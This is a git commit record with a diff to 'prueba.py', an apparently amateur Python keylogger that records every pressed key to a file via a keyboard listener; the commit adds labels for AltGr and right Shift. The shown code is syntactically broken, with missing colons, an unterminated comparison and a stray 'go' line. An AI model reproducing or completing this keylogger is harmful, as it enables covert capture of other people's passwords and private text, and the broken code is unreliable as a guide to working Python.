ef210a667595438ce4c8220db0ed4c8b801983ec
ZXDe <43547674+ZXDe@users.noreply.github.com>
2020-07-29 22:11:52 -0500

    Update prueba.py

--- prueba.py
+++ prueba.py
@@ -14,9 +14,13 @@ def key_recorder(key):
         f.write(' ')
     elif key =='Key.backspace':
         f.write('%BORRAR%')
+    elif key =='<65027>'
+        f.write('alt gr')
+    elif key =='Key.shift_r'
+        f.write('Shift Derecho')
+    elif key =='
 
 with Listener(on_press=key_recorder) as l:
     l.join()
 go
 
-Prueba de commit
